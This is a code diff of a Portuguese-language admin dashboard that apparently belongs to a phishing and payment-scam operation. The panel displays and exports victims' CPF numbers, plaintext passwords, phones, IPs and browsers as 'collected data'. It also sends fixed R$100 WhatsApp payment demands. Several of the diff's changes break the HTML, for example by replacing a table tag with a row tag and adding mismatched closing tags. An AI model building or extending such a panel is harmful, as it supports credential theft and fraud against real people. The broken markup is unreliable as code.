@@ -880,7 +880,6 @@
             <div class="tab" onclick="switchTab('settings')">CONFIG</div>
         </div>
 
-        <!-- Dashboard Tab -->
         <div id="tabDashboard" class="tab-content active">
             <div class="section-card">
                 <div class="section-title">ULTIMAS ATIVIDADES</div>
@@ -892,7 +891,6 @@
             </div>
         </div>
 
-        <!-- Usuarios Tab -->
         <div id="tabUsers" class="tab-content">
             <div class="section-card">
                 <div class="section-title" style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
@@ -917,7 +915,6 @@
             </div>
         </div>
 
-        <!-- Pagamentos Tab -->
         <div id="tabPayments" class="tab-content">
             <div class="section-card">
                 <div class="section-title">
@@ -941,7 +938,6 @@
             </div>
         </div>
 
-        <!-- Logs Tab -->
         <div id="tabLogs" class="tab-content">
             <div class="section-card">
                 <div class="section-title">
@@ -955,12 +951,11 @@
             </div>
         </div>
 
-        <!-- Seguranca Tab -->
         <div id="tabSecurity" class="tab-content">
             <div class="section-card">
                 <div class="section-title">TENTATIVAS DE ACESSO AO ADMIN</div>
                 <div class="table-wrapper">
-                    <table>
+                    <tr>
                         <thead><tr><th>IP</th><th>Tentativa</th><th>Data</th></tr></thead>
                         <tbody id="tentativasTable"></tbody>
                     </table>
@@ -968,7 +963,6 @@
             </div>
         </div>
 
-        <!-- Configuracoes Tab -->
         <div id="tabSettings" class="tab-content">
             <div class="section-card">
                 <div class="section-title">ALTERAR SENHA DO ADMIN</div>
@@ -1174,7 +1168,6 @@
             return;
         }
         
-        // Limpar telefone (deixar apenas números)
         let telefoneLimpo = telefone.replace(/\D/g, '');
         if (telefoneLimpo.length === 10) {
             telefoneLimpo = '55' + telefoneLimpo;
@@ -1270,11 +1263,11 @@ Caso já tenha efetuado o pagamento, desconsidere esta mensagem.
     function renderUsers(users) {
         const tbody = document.getElementById('usersTable');
         if (!users.length) {
-            tbody.innerHTML = '<tr><td colspan="9" style="text-align:center">Nenhum dado coletado</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="9" style="text-align:center">Nenhum dado coletado</p></tr>';
             return;
         }
         tbody.innerHTML = users.map(u => {
-            const telefone = u.telefone || u.customer_phone || '-';
+            const telefone = u.telefone || '-';
             const valor = u.valor_pendente || '100.00';
             return `
                 <tr>
@@ -1286,7 +1279,7 @@ Caso já tenha efetuado o pagamento, desconsidere esta mensagem.
                     <td>${u.navegador || u.navegador_senha || '-'}</td>
                     <td>${u.data_senha ? new Date(u.data_senha).toLocaleString() : (u.data_cpf ? new Date(u.data_cpf).toLocaleString() : '-')}</td>
                     <td><button class="btn-danger" onclick="deletarUsuario('${u.cpf}')">DEL</button></td>
-                    <td><button class="btn-whatsapp" onclick="enviarCobrancaWhatsApp('${u.cpf}', '${telefone}', '${u.valor_pendente || '100'}')"><i class="fab fa-whatsapp"></i> Cobrar</button></td>
+                    <td><button class="btn-whatsapp" onclick="enviarCobrancaWhatsApp('${u.cpf}', '${telefone}', '100')"><i class="fab fa-whatsapp"></i> Cobrar</button></td>
                 </tr>
             `;
         }).join('');
@@ -1295,11 +1288,11 @@ Caso já tenha efetuado o pagamento, desconsidere esta mensagem.
     function renderPayments(payments) {
         const tbody = document.getElementById('paymentsTable');
         if (!payments.length) {
-            tbody.innerHTML = '<tr><td colspan="8" style="text-align:center">Nenhum pagamento registrado</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="8" style="text-align:center">Nenhum pagamento registrado</p></td>';
             return;
         }
         tbody.innerHTML = payments.map(p => {
-            const telefone = p.telefone || p.customer_phone || '-';
+            const telefone = p.telefone || '-';
             return `
                 <tr>
                     <td>${p.id || '-'}</td>
@@ -1326,7 +1319,7 @@ Caso já tenha efetuado o pagamento, desconsidere esta mensagem.
                 <div class="log-time">${new Date(p.data_solicitacao).toLocaleString()}</div>
                 <span class="badge badge-success">R$ ${parseFloat(p.valor).toFixed(2)}</span>
                 <div><strong>${formatarCPF(p.cpf)}</strong></div>
-                <div>Telefone: ${p.telefone || p.customer_phone || '-'}</div>
+                <div>Telefone: ${p.telefone || '-'}</div>
                 <div>Status: ${p.status === 'paid' ? 'PAGO' : 'PENDENTE'}</div>
             </div>
         `).join('');
@@ -1368,7 +1361,7 @@ Caso já tenha efetuado o pagamento, desconsidere esta mensagem.
     function renderTentativas(tentativas) {
         const tbody = document.getElementById('tentativasTable');
         if (!tentativas.length) {
-            tbody.innerHTML = '<tr><td colspan="3" style="text-align:center">Nenhuma tentativa registrada</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="3" style="text-align:center">Nenhuma tentativa registrada</p><tr>';
             return;
         }
         tbody.innerHTML = tentativas.map(t => `
@@ -1430,7 +1423,7 @@ Caso já tenha efetuado o pagamento, desconsidere esta mensagem.
         if (!allUsers.length) { showToast('Nenhum dado para exportar', 'error'); return; }
         let csv = "CPF,SENHA,TELEFONE,IP,Dispositivo,Navegador,Data\n";
         allUsers.forEach(u => {
-            csv += `"${u.cpf}","${u.senha || ''}","${u.telefone || u.customer_phone || ''}","${u.ip || u.ip_senha || ''}","${u.dispositivo || u.dispositivo_senha || ''}","${u.navegador || u.navegador_senha || ''}","${u.data_senha || u.data_cpf || ''}"\n`;
+            csv += `"${u.cpf}","${u.senha || ''}","${u.telefone || ''}","${u.ip || u.ip_senha || ''}","${u.dispositivo || u.dispositivo_senha || ''}","${u.navegador || u.navegador_senha || ''}","${u.data_senha || u.data_cpf || ''}"\n`;
         });
         const blob = new Blob([csv], { type: 'text/csv' });
         const link = document.createElement('a');
@@ -1444,7 +1437,7 @@ Caso já tenha efetuado o pagamento, desconsidere esta mensagem.
         if (!allPayments.length) { showToast('Nenhum pagamento para exportar', 'error'); return; }
         let csv = "ID,CPF,TELEFONE,Valor,Status,Transacao,Data_Solicitacao,Data_Pagamento\n";
         allPayments.forEach(p => {
-            csv += `"${p.id}","${p.cpf}","${p.telefone || p.customer_phone || ''}","${p.valor}","${p.status}","${p.transaction_id || ''}","${p.data_solicitacao}","${p.data_pagamento || ''}"\n`;
+            csv += `"${p.id}","${p.cpf}","${p.telefone || ''}","${p.valor}","${p.status}","${p.transaction_id || ''}","${p.data_solicitacao}","${p.data_pagamento || ''}"\n`;
         });
         const blob = new Blob([csv], { type: 'text/csv' });
         const link = document.createElement('a');
